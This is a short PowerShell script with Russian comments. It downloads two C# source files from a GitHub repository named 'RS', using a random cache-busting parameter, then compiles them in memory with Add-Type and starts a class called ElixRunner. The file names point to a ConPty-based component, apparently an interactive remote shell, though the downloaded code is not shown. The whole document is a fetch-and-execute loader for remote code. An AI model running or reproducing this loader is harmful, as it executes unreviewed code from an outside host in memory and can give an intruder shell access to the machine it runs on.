# Указываем ссылки с генерацией случайного числа для обхода кэша
$uri1 = "https://raw.githubusercontent.com/Metivzora/RS/main/ConPtyApi.cs?v=" + (Get-Random)
$uri2 = "https://raw.githubusercontent.com/Metivzora/RS/main/Runner.cs?v=" + (Get-Random)

$web = New-Object System.Net.WebClient
try {
    # Скачиваем код. Принудительно приводим каждую переменную к строгому типу String
    [string]$c1 = $web.DownloadString($uri1)
    [string]$c2 = $web.DownloadString($uri2)

    if ($c1 -and $c2) {
        # Используем метод [string]::Concat — это нативный метод .NET для сборки строк.
        # Он принимает любые объекты и гарантированно возвращает ОДНУ строку [string]
        $fullCode = [string]::Concat($c1, [System.Environment]::NewLine, $c2)
        
        # Компилируем строго текстовые данные
        Add-Type -TypeDefinition $fullCode

        # Запуск
        [ElixRunner]::Start()
    }
} catch {
    Write-Error "Ошибка инициализации: $($_.Exception.Message)"
}
